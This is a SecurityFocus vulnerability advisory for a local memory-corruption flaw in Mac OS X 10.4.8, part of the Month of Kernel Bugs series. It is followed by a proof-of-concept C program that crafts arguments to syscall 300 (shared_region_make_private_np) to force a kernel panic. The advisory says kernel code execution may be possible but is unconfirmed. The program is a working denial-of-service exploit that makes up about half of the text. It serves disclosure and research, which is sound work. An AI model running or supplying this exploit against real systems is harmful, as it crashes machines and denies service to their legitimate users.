source: http://www.securityfocus.com/bid/21349/info

Apple Mac OS X is prone to a local memory-corruption vulnerability. This issue occurs when the operating system fails to handle specially crafted arguments to a system call. 

Attackers may exploit this issue to cause a kernel panic, effectively denying further service to legitimate users. Due to the nature of this issue, successful exploits may potentially result in the execution of arbitrary machine code in the context of the affected kernel, but this has not been confirmed.

Mac OS X version 10.4.8 is vulnerable to this issue; other versions may also be affected.

/*
 * Copyright 2006 (c) LMH <lmh@info-pull.com>.
 * All Rights Reserved.
 * ----           
 *               .---. .---. 
 *              :     : o   :    me want cookie and clues! L0W LEVA! - A 
J. H
 *          _..-:   o :     :-.._    / 
 *      .-''  '  `---' `---' "   ``-.    
 *    .'   "   '  "  .    "  . '  "  `. 
 *   :   '.---.,,.,...,.,.,.,..---.  ' ;
 *   `. " `.                     .' " .' kudos to ilja, kevin and icer.
 *    `.  '`.                   .' ' .'           "proof of concept" for
 *     `.    `-._           _.-' "  .'  .-------.       MOKB-28-11-2006.
 *       `. "    '"--...--"'  . ' .'  .'  � o   �`.
 *       .'`-._'    " .     " _.-'`. :  C o C o A :
 *     .'      ```--.....--'''    ' `:_ o      o  :
 *   .'    "     '         "     "   ; `.;";";"; _'
 *  ;         '       "       '     . ; .' ; ; ;
 * ;     '         '       '   "    .'      .-'
 * '  "     "   '      "           "    _.-'
 */

#include <stdio.h>
#include <sys/types.h>
#include <fcntl.h>

int main() {
		/* shared_region_make_private_np = 300 (xnu-792.6.70), 
3rd arg unused */
        syscall(300, 0x8000000, 0xdeadface, 0xffffffff);
        return 0;
}